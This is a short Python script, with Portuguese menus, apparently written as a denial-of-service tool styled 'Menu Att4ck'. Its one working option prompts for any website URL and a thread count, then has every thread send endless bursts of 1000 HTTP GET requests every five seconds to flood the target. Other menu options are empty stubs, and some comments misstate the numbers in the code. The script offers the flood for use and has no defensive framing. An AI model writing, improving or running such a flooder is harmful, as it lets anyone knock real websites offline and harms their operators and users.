import os
import threading
import requests
import time

def exibir_arte_ascii():
    arte_ascii = r'''
   _______
 /        \
|  O    O  |
|    ∆     |
|__________|
|    |     |
|    |     |
    '''
    print(arte_ascii)

def exibir_menu_principal():
    print("\nMenu Att4ck\n")
    print("1- WEBSITE")
    print("2- IP-N3T")
    print("3- JOG0S")

def exibir_menu_metodos_privs():
    print("\nMetods Privs\n")
    print("1- KILLER-GET (Potência: Alta)")
    print("2- BENGALA (Potência: Média)")
    print("3- SATURN-v9 (Potência: Alta)")

def enviar_pacotes(url, threads_total, pacotes_por_thread, intervalo):
    def send_request():
        try:
            while True:
                for _ in range(pacotes_por_thread):
                    requests.get(url)
                time.sleep(intervalo)
        except requests.RequestException as e:
            print(f"Erro ao enviar pacotes: {e}")

    threads = []
    for _ in range(threads_total):
        thread = threading.Thread(target=send_request)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

def main():
    os.system("clear")  # Substitua por "cls" se estiver usando Windows
    exibir_arte_ascii()
    exibir_menu_principal()

    opcao_principal = input("Escolha o número da opção desejada: ")

    if opcao_principal == "1":
        exibir_menu_metodos_privs()
        opcao_metodos = input("Escolha o número do método desejado: ")

        if opcao_metodos == "2":
            url = input("{¢} URL: ")
            threads_total = int(input("{¢} Threads total: "))
            pacotes_por_thread = 1000# Ajuste para 250 mil pacotes
            intervalo = 5 # 30 segundos
            potencia = "Super Hiper Blayer Alta"  # Potência do método BENGALA
            print(f"\nEnviando pacotes para {url} com potência {potencia}...\n")
            enviar_pacotes(url, threads_total, pacotes_por_thread, intervalo)
        else:
            print("Opção de método não suportada.")

    elif opcao_principal == "2":
        print("Implemente lógica para IP-N3T aqui.")

    elif opcao_principal == "3":
        print("Implemente lógica para JOG0S aqui.")

    else:
        print("Opção inválida.")

if __name__ == "__main__":
    main()
